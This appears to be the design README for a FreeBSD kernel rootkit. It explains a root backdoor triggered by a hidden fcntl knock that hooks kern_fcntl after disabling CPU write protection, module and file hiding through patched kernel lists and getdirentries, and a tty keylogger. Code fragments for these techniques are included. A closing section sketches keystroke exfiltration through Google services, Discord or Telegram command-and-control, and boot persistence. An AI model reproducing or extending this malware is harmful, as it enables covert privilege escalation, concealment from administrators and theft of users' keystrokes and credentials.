# install
the install script kldloads the elevate module into the kernel (checking its unloaded before doing so)

once loaded the module hides install, elevate and kelevate.ko from kldstat and getdirentries (see the evasion section), therefore if you want to become root just do ./elevate in the home dir

after loading the module the script cleans up by deleting the .ko file


# elevate
this is very rudimentary so bare with it atm.

the way privesc works for now is like so:
- before we build, a build script will generate a random number between 0 to 27^8 or so. 
- its inlined into the module and the binary as the knock key. obvioulsy this is terrible, but it'll do for now.

if you run `truss` (aka worse version of strace) on basically any program youll notice one of the most boring syscalls it makes is `fcntl`:
```
close(3)					 = 0 (0x0)
munmap(0x254254b9c000,53060)			 = 0 (0x0)
ioctl(1,TIOCGETA,0x25424f32f004)		 = 0 (0x0)
ioctl(1,TIOCGWINSZ,0x25424f32f65c)		 = 0 (0x0)
getuid()					 = 1001 (0x3e9)
fstatat(AT_FDCWD,".",{ mode=drwxr-xr-x ,inode=34,size=14,blksize=4096 },0x0) = 0 (0x0)
open(".",O_RDONLY|O_CLOEXEC,00)			 = 3 (0x3)
fchdir(0x3)					 = 0 (0x0)
open(".",O_RDONLY|O_CLOEXEC,00)			 = 4 (0x4)
open(".",O_RDONLY|O_DIRECTORY|O_CLOEXEC,00)	 = 5 (0x5)
fcntl(5,F_ISUNIONSTACK,0x0)	
```

we will use the fact that `fcntl` takes 3 args to smuggle in information. 

instead of modifying the syscall table, we overwrite the first 13 bytes of kern_fcntl (which is what it falls to anyway) with a trampoline that jmps to our own code. the first 13 bytes are these instructions:

```
push 	rbp
mov 	rsp, rbp
push 	r15
push 	r14
push	r13
push	r12
push	rbx
```

we then save these 13 bytes for unpatching. notably, this is brittle for now (e.g. no aob-like scan? could get screwed up if recompiled or update, etc). 

typically, writing to kernel code is blocked by the cpu, as these pages are read-only. to fix this we simply clear the write protect (coincidentally, the WP flag) in the cpu's cr0 regs. obviously to deal with multicore bs, we use `smp_rendezvous` to make sure only cpu0 gets to do anything interesting.

when we use `elevate`, we call `fcntl` multiple times with special arguments that pertain to the key in base-27:

```
fcntl(fd, cmd, arg)
```
as fd can only be 0-2 (otherwise a. itd not work well, b. itd break), cmd can be F_GETFD, F_GETFL, or F_GETOWN, and arg can also be 0-2.

thus, one fcntl call represents one single digit from 0 to 26. we do this 8 times, and our kit reassembles these digits into the key:

```c
int d = sfd * 9 + scmd * 3 + sarg;
```

our kit tracks the pid trying to knock in this format, and how many digits it got right so far. once all 8 digits arrive correctly, we trigger privesc.

when we privesc we do so like this:

1. we make the normal kern_fcntl run first; as during testing if we didnt do this it would see a root process and populate our uids with junk
2. pid 1 (init) is a freebsd process running as root. we use `crdup` on init to clone its creds
3. now we use `proc_set_cred` to replace our process creds with the duped root creds. then we clean up, and unpatch the trampoline

our kern_fcntl hook nukes itself after the first ever privesc, after which it repatches the old 13 bytes. after around 10 seconds we then hook it again to do a little bit of messing with detectors that try and immediately check every nook and cranny

# evasion
this is very much in dev.
currently, the kit attempts basic evasion.

## hiding from kldstat
to hide from this, we can simply go through `linker_files` (ll of loaded modules), walk it,  find our own entry, then unlink it.

in addition, we can detach ourselves from the `modules` list as well. as it is a private struct we need to be very careful. for now, we use raw offsets to try and confirm that this is the modules list before doing work on it carefully:

```c
#define mlinknext 0
#define mlinkprev 8
#define mfile 32
```

we then check that the offsets are correct:
```c
 linker_file_t lf = *(linker_file_t*)(m + mfile);
   if (lf == NULL || lf->filename == NULL ||
       strncmp(lf->filename, "kelevate", 8) != 0)
       return (ENOENT);
```
+32 holds `mfile` which should match kelevate, as its the one that got loaded. obviously this is very scuffed since its gonna immediately bail on a different version, but it will do for now. we find the list's base address by walking backwards thru our prev ptrs until we find the list head, which (since its in the kernel static data area) usually starts with 0xffffffffxxx. 

after this, we lock and do the same thing as the prior list.


## hiding from ls, find, etc.

we do the same thing to `getdirentries` by just patching the first 12 bytes again and trampolining it.

first we call `getdirentries` to populate a buf with dirents,then we copy it from userspace to kernelspace memory.

we walk through it entry by entry (yep lol), and if the filename matches  `elevate` or `install` or `kelevate.ko` we skip it by shifting all entries after it backward:
```c
static
int shoo (const char* name)
{

	for (int i = 0; hiddenfiles[i] != NULL; i++)
		if (strcmp(name, hiddenfiles[i]) == 0)
			return (1);
	return (0);
}
```

```c
int from = 0;
	int to = 0;
	while (from < n) {
		struct dirent * de = (struct dirent *)(kbuf+from);

		if (de->d_reclen == 0)
			break;

		if (!shoo(de->d_name)) {
            // here
			if (to != from) memmove(kbuf+to, kbuf+from, de->d_reclen);

			to += de->d_reclen;
		}
		from += de->d_reclen;
	}
```

we then copy it back to userspace, and adjust the return value aswell just in case someone tries to look at the byte sz diff. unlike fcntl where it pops up once in a while, this is a permanent change

# keylogger (basic)

This basic keylogger intercepts keyboard input for text fields and prints (printfs) the byte values to dmesg. There is currently no persistence, exfiltration, ring buffer or reading interface implemented. The plans for future extensions are listed below.

## Hookpoints

ttydisc_read in kern/tty_ttydisc.c

The function ttydisc_read contains an identical prologue sequence as kern_fcntl. This is exactly 13 bytes long.


```

push rbp

mov rsp, rbp

push r15

push r14

push r13

push r12

push rbx

```

Therefore this can easily be hooked using the current shook framework.

## How it works

The hook will first call regular ttydisc_read using srecoverorig. It will then work out how many bytes were returned.

```c

ssize_t oresid = uio->uio_resid;

err = orig(tp, uio, ioflag);

ssize_t n = oresid - uio->uio_resid;

```

If n > 0 is defined the hook will copyin the first n bytes from uio->uio_iov[0].iov_base of uio into a small kernel stack buffer (256 bytes). It will then print KEYLOG: %D with a printf.

Using copyin.

As both the return value and uio_resid are left unchanged the original syscall behaviour is unaffected. Less than ideal but the interception steps are minimal (copyin + printf).

## What was tested

Intercepting ssh/pty input within the guest. We are able to type in a specific string in SSH and verify that each byte is present in dmesg. At this stage we don't have per-tty de-multiplexing as there is no ring buffer to store data, however this could be implemented in the future with adding the pointer to tp->t_dev as a prefix.

## Detectability

We have:

Static issues where the first byte of ttydisc_read is not equal to the known 55 48 89 e5 41 57 41 56 41 55 41 54 53. (As with kern_fcntl)

Dynamic issues where we can see the plaintext bytes of our keyboard input being sent to dmesg. At the point of interception if someone looks at the first bytes of ttydisc_read they will notice something is wrong as we have a 48 b8 (mov rax, imm64) prefix.

When the module is unloaded keylog_fini is called. The ttydisc_read hook is removed and the original 13 bytes are re-added. However shidem will have removed the module from the system so kldunload won't be able to find it whilst the module is loaded. This means that this will only happen when shidem is disabled during compile. Not tested at this stage, so this is a known issue.

# plans for future bonus stuff

keylogger: as keyboard buffers live in kernel memory, we can invert the usual kl model by doing direct reads on /dev/kmem. we can then encrypt it with an operators x25519 pubkey, then abuse existing public infrastructure such as any *.google.com that lets us read stuff (aka dds) to send them with chunks. our operator box will read off of e.g. sheets results, then decrypt it and obtain creds. +, to follow the actual intended model instead of making things around it we do `./log <ip>` on operator box

remote: likely discord/tele c2 that could e.g. use wormable exploits that abuse mailbox drafts to communicate with operator and break telemetry chain. alterantively, a simpler e.g. arp padding/icmp magic packet.

persist: potentially adding a load=blah line to /boot/loader.conf.local to load us on every boot.

# plans for final

currently everything relies on ugly easily dtc trampoline hooking, especially for getdirentries. for the final, we would likely replace this with a vtable swap, so instead of modifying stuff against e.g. getdirentries actual code, we clone the vnode's op table, replace a function ptr with our own, and redirect a legit one from the actual op table to ours so no actual kernel code is modified at all. 
